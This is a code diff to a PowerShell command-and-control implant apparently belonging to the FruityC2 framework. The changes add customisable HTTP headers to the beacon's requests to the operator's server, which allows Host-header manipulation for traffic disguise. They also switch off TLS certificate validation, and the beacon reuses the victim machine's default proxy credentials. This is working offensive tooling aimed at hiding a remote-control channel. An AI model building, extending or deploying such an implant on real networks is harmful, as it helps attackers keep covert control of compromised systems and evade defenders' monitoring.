@@ -28,8 +28,12 @@ function Invoke-FruityC2 {
         [String]$UA = "",
         [Bool]$stager = $true,
         [String]$target = "",
-        [String]$mode = "normal"
+        [String]$mode = "normal",
+        [String]$pg_header = $r_server
     )
+
+    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
+    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls;
 
     $proxy_list = @{}
     $proxy_agent = @{}
@@ -45,6 +49,7 @@ function Invoke-FruityC2 {
     [String]$script:session_id = $session_id
     [String]$script:target = $target
     [String]$script:mode = $mode
+    [String]$script:pg_header = $pg_header
 
     # DEBUG
     Write-Host "[DEBUG DEFAULT]" -BackgroundColor Red
@@ -56,6 +61,7 @@ function Invoke-FruityC2 {
     Write-Host "POST-ID: $script:post_id"
     Write-Host "SESSION-ID: $script:session_id"
     Write-Host "target: $script:target"
+    Write-Host "PG_HEADER: $script:pg_header"
     Write-Host "-------"
 
     # http://waynes-world-it.blogspot.co.uk/2008/05/reading-web-content-with-powershell.html
@@ -221,7 +227,19 @@ function Invoke-FruityC2 {
             $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
             $wc.Headers.Add("User-Agent",$UA)
             $wc.Headers.Add("Cookie", "$SESSION_ID=$TARGET;")
-
+            
+            if ($pg_header -ne "") {
+				$hs = $pg_header.split("|")
+				foreach ($h in $hs) {
+					$i = $h.split(" ")
+					if ($PSVersionTable.PSVersion.Major -eq 2 -And $i[0] -Eq "Host" ) {
+						#Write-Host "*** skip: $($i[0])" 
+					} else {
+						$wc.Headers.Add($i[0], $i[1])
+					}
+				}
+			}
+            
             $request = "http$($r_ssl)://$($r_server):$($r_port)$($path)"
 
             #Write-Host "GET-DATA: $request"
@@ -248,6 +266,18 @@ function Invoke-FruityC2 {
             $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
             $wc.Headers.Add("User-Agent",$UA)
             $wc.Headers.Add("Cookie", "$SESSION_ID=$TARGET;")
+            
+            if ($pg_header -ne "") {
+				$hs = $pg_header.split("|")
+				foreach ($h in $hs) {
+					$i = $h.split(" ")
+					if ($PSVersionTable.PSVersion.Major -eq 2 -And $i[0] -Eq "Host" ) {
+						#Write-Host "*** skip: $($i[0])" 
+					} else {
+						$wc.Headers.Add($i[0], $i[1])
+					}
+				}
+			}
 
             $request = "http$($r_ssl)://$($r_server):$($r_port)$($path)"
 
@@ -538,6 +568,7 @@ function Invoke-FruityC2 {
     Write-Host "POST: $script:path_post"
     Write-Host "POST-ID: $script:post_id"
     Write-Host "SESSION-ID: $script:session_id"
+    Write-Host "PG_HEADER: $script:pg_header"
     Write-Host "-------"
 
     $timeout = new-timespan -Minutes 10
@@ -900,4 +931,4 @@ function Invoke-FruityC2 {
     }
     echo "Bye Bye ;)"
 }
-#Invoke-FruityC2 -r_server "x.x.x.x" -r_port "xx" -r_ssl = ""
+#Invoke-FruityC2 -r_server "x.x.x.x" -r_port "xx" -r_ssl = "" -pg_header ""
